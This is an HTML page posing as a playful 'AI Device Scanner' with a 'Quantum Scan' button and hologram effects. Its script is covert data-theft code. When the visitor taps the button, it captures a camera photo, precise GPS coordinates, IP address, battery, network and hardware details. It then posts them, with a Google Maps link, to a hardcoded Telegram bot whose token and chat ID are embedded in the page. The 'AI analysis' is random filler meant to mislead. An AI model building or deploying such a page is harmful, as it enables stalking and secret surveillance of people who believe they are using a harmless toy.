<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Super AI Device Scanner</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <style>
    :root {
      --primary: #2ecc71;
      --secondary: #3498db;
    }
    body { 
      font-family: 'Roboto', Arial, sans-serif; 
      text-align: center; 
      padding: 20px; 
      background: #1a1a1a;
      color: white;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    .scanner-box {
      width: 300px;
      height: 300px;
      border: 4px solid var(--primary);
      border-radius: 20px;
      margin: 20px auto;
      position: relative;
      overflow: hidden;
      box-shadow: 0 0 30px rgba(46, 204, 113, 0.3);
    }
    .scanner-line {
      position: absolute;
      width: 100%;
      height: 4px;
      background: var(--primary);
      animation: scan 3s infinite;
      box-shadow: 0 0 10px var(--primary);
    }
    @keyframes scan {
      0% { top: 0; opacity: 0; }
      10% { opacity: 1; }
      90% { opacity: 1; }
      100% { top: 100%; opacity: 0; }
    }
    button {
      padding: 15px 40px;
      font-size: 20px;
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      border: none;
      border-radius: 30px;
      cursor: pointer;
      transition: all 0.3s;
      color: white;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin: 20px;
      box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
    }
    #loading {
      display: none;
      font-size: 1.5em;
      color: var(--primary);
      text-shadow: 0 0 10px rgba(46, 204, 113, 0.5);
      margin: 10px;
    }
    .hologram-effect {
      position: fixed;
      pointer-events: none;
      mix-blend-mode: screen;
      opacity: 0.3;
      z-index: 9999;
    }
    @keyframes hologram {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    /* Gaya untuk informasi lokasi */
    #location-info {
      margin-top: 10px;
      font-size: 1em;
    }
    #location-info a {
      color: var(--secondary);
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <h1 style="color: var(--primary); margin-bottom: 20px;">üõ∏ AI Device Scanner</h1>
  <div class="scanner-box">
    <div class="scanner-line"></div>
    <video id="video" width="300" height="300" autoplay playsinline muted></video>
  </div>
  <button id="capture-btn">üöÄ Start Quantum Scan</button>
  <button id="location-btn">üìç View My Location</button>
  <div id="location-info"></div>
  <div id="loading">üî≠ Scanning Quantum Signature...</div>

  <script>
    // === Konfigurasi Bot Telegram ===
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';

    // Variabel global
    let currentStream = null;
    let isScanning = false;
    const video = document.getElementById('video');
    const loading = document.getElementById('loading');

    // === Fungsi Helper untuk Menampilkan Error dan Notifikasi ===
    function showError(title, error) {
      alert(`${title}: ${error.message || error}`);
      console.error(title, error);
    }

    function showToast(message, type) {
      // Untuk demo, gunakan console; bisa diganti dengan notifikasi visual sesuai kebutuhan.
      console.log(`${type.toUpperCase()}: ${message}`);
    }

    // === Fungsi Helper untuk Mendapatkan Lokasi (GPS) ===
    function getPreciseLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error("Geolocation not supported"));
        } else {
          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
        }
      });
    }

    // === Fungsi Dummy untuk Analisis Matriks Perangkat ===
    function analyzeDeviceMatrix() {
      // Data dummy; ganti dengan analisis perangkat jika diperlukan.
      return Promise.resolve([[1, 0, 1], [0, 1, 0], [1, 0, 1]]);
    }

    // === Fungsi Dummy untuk Menghasilkan Matriks Gambar ===
    function getImageMatrix(canvas) {
      // Contoh sederhana: kembalikan lebar dan tinggi gambar sebagai matriks.
      return { width: canvas.width, height: canvas.height };
    }

    // === Fungsi untuk Mengubah dataURI ke Blob ===
    async function dataURItoBlob(dataURI) {
      const response = await fetch(dataURI);
      return await response.blob();
    }

    // === Fungsi untuk Mengumpulkan Informasi Detail Perangkat ===
    async function getDeviceInfo() {
      // Informasi Battery
      let batteryInfo = {};
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          batteryInfo = {
            charging: battery.charging,
            level: battery.level,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
          };
        } catch (e) {
          batteryInfo = { error: "Battery info not available" };
        }
      } else {
        batteryInfo = { error: "Battery API not supported" };
      }

      // Ambil alamat IP melalui API eksternal (ipify)
      let ip = "Not available";
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        ip = data.ip;
      } catch (e) {
        console.error("IP fetch error:", e);
      }

      // Informasi koneksi jaringan
      const networkInfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      let connectionInfo = {};
      if (networkInfo) {
        connectionInfo = {
          effectiveType: networkInfo.effectiveType,
          downlink: networkInfo.downlink,
          rtt: networkInfo.rtt,
          saveData: networkInfo.saveData
        };
      }

      return {
        os: navigator.userAgent, // Informasi OS dapat diambil dari userAgent
        platform: navigator.platform,
        ram: navigator.deviceMemory || "Not available",
        cores: navigator.hardwareConcurrency || "Not available",
        battery: batteryInfo,
        network: connectionInfo,
        ip: ip,
        resolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        userAgent: navigator.userAgent
      };
    }

    // === Hologram Effect ===
    function createHologramEffect() {
      const colors = ['#00ffff', '#ff00ff', '#ffff00'];
      const effect = document.createElement('div');
      effect.className = 'hologram-effect';
      
      colors.forEach(color => {
        const layer = document.createElement('div');
        layer.style.cssText = `
          position: fixed;
          top: -50%;
          left: -50%;
          width: 200%;
          height: 200%;
          background: radial-gradient(circle, ${color} 0%, transparent 70%);
          animation: hologram 7s linear infinite;
        `;
        effect.appendChild(layer);
      });
      document.body.appendChild(effect);
    }

    // === Inisialisasi Kamera ===
    async function initCamera() {
      try {
        const constraints = {
          video: { 
            facingMode: 'environment',
            width: { ideal: 1920 },
            height: { ideal: 1080 },
            frameRate: { ideal: 60 }
          },
          audio: false
        };

        if (currentStream) {
          currentStream.getTracks().forEach(track => track.stop());
        }

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        currentStream = stream;
        video.srcObject = stream;

        await new Promise((resolve, reject) => {
          video.onloadedmetadata = resolve;
          video.onerror = reject;
        });

        await video.play();
        createHologramEffect();
      } catch (err) {
        showError('Quantum Scanner Error', err);
      }
    }

    // === Fungsi untuk Melihat Lokasi dan Menampilkan URL Google Maps ===
    async function viewLocation() {
      try {
        const position = await getPreciseLocation();
        const { latitude, longitude } = position.coords;
        const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
        document.getElementById('location-info').innerHTML = `
          <p>Your Location: <strong>${latitude.toFixed(6)}, ${longitude.toFixed(6)}</strong></p>
          <p><a href="${mapsUrl}" target="_blank">View on Google Maps</a></p>
        `;
      } catch (error) {
        showError('Location Error', error);
      }
    }

    // === Proses Quantum Scan ===
    async function startQuantumScan() {
      if (isScanning) return;
      isScanning = true;
      loading.style.display = 'block';

      try {
        // Jalankan beberapa proses secara paralel: pengambilan gambar, lokasi, matriks, analisis AI, dan info perangkat.
        const [photoData, location, deviceMatrix, aiAnalysis, deviceInfo] = await Promise.all([
          captureQuantumImage(),
          getPreciseLocation(),
          analyzeDeviceMatrix(),
          performAIAnalysis(),
          getDeviceInfo()
        ]);

        const report = generateHologramReport(photoData, location, deviceMatrix, aiAnalysis, deviceInfo);
        await sendToTelegram(report);
        showToast('üåå Quantum Signature Captured!', 'success');
      } catch (error) {
        showError('Quantum Anomaly Detected', error);
      } finally {
        isScanning = false;
        loading.style.display = 'none';
      }
    }

    // === Fungsi untuk Mengambil Gambar dengan Efek Quantum ===
    async function captureQuantumImage() {
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      context.drawImage(video, 0, 0);
      applyQuantumFilter(context, canvas);
      
      return {
        image: canvas.toDataURL('image/webp', 0.9),
        matrix: getImageMatrix(canvas)
      };
    }

    // === Fungsi Analisis AI (Dummy) ===
    async function performAIAnalysis() {
      const aiData = {
        threatLevel: Math.floor(Math.random() * 100),
        biometrics: navigator.userAgent.includes('Mobile') ? 'Humanoid Detected' : 'AI Signature',
        quantumEntanglement: `${Math.random().toFixed(5)}Q`
      };

      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          aiData.energySignature = `${Math.round(battery.level * 100)}%`;
        } catch (e) {
          aiData.energySignature = 'Unknown';
        }
      }
      return aiData;
    }

    // === Fungsi untuk Menghasilkan Laporan Hologram dengan Informasi Perangkat ===
    function generateHologramReport(photo, location, matrix, ai, deviceInfo) {
      const timestamp = new Date().toISOString();
      return {
        image: photo.image,
        metadata: {
          spacetimeCoordinates: {
            lat: location.coords.latitude,
            lon: location.coords.longitude,
            accuracy: location.coords.accuracy,
            altitude: location.coords.altitude || 'CLASSIFIED'
          },
          quantumMatrix: matrix,
          aiAnalysis: ai,
          deviceInfo: deviceInfo,
          temporalSignature: timestamp
        }
      };
    }

    // === Integrasi dengan Telegram ===
    async function sendToTelegram(report) {
      const formData = new FormData();
      const blob = await dataURItoBlob(report.image);
      
      // Buat caption laporan dengan data quantum scan dan detail perangkat, termasuk tautan lokasi
      const lat = report.metadata.spacetimeCoordinates.lat;
      const lon = report.metadata.spacetimeCoordinates.lon;
      const mapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
      
      const caption = `ü™ê *Quantum Scan Report*\n\n` +
        `üìÖ *Timestamp:* ${new Date(report.metadata.temporalSignature).toLocaleString()}\n` +
        `üåç *Coordinates:* \`${lat.toFixed(6)}, ${lon.toFixed(6)}\` ([View Location](${mapsLink}))\n` +
        `üéØ *Accuracy:* ${Math.round(report.metadata.spacetimeCoordinates.accuracy)}m\n\n` +
        `‚ö†Ô∏è *Threat Level:* ${report.metadata.aiAnalysis.threatLevel}%\n` +
        `üß¨ *Biometrics:* ${report.metadata.aiAnalysis.biometrics}\n` +
        `‚öõÔ∏è *Quantum Entanglement:* ${report.metadata.aiAnalysis.quantumEntanglement}\n\n` +
        `üñ• *Device Info:*\n` +
        `‚Ä¢ *OS/UserAgent:* ${report.metadata.deviceInfo.os}\n` +
        `‚Ä¢ *Platform:* ${report.metadata.deviceInfo.platform}\n` +
        `‚Ä¢ *RAM:* ${report.metadata.deviceInfo.ram} GB\n` +
        `‚Ä¢ *CPU Cores:* ${report.metadata.deviceInfo.cores}\n` +
        `‚Ä¢ *Battery:* ${(report.metadata.deviceInfo.battery.level * 100) || 'N/A'}% ${report.metadata.deviceInfo.battery.charging ? '(Charging)' : ''}\n` +
        `‚Ä¢ *Network:* ${report.metadata.deviceInfo.network.effectiveType || 'N/A'}\n` +
        `‚Ä¢ *IP Address:* ${report.metadata.deviceInfo.ip}\n` +
        `‚Ä¢ *Resolution:* ${report.metadata.deviceInfo.resolution}\n` +
        `‚Ä¢ *Timezone:* ${report.metadata.deviceInfo.timezone}`;

      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, `quantum_scan_${Date.now()}.webp`);
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');

      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      if (!response.ok) {
        throw new Error('Quantum Communication Failed');
      }
    }

    // === Efek Filter Quantum pada Gambar ===
    function applyQuantumFilter(ctx, canvas) {
      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const data = imageData.data;
      for (let i = 0; i < data.length; i += 4) {
        data[i] = Math.abs(255 - data[i]);       // Red (inversi)
        // data[i + 1] tetap (Green)
        data[i + 2] = Math.abs(255 - data[i + 2]); // Blue (inversi)
      }
      ctx.putImageData(imageData, 0, 0);
    }

    // === Inisialisasi Scanner dan Event Listener ===
    if (navigator.mediaDevices) {
      initCamera();
      document.getElementById('capture-btn').onclick = startQuantumScan;
      document.getElementById('location-btn').onclick = viewLocation;
    } else {
      showToast('Quantum Scanner Not Supported', 'error');
    }
  </script>
</body>
</html>
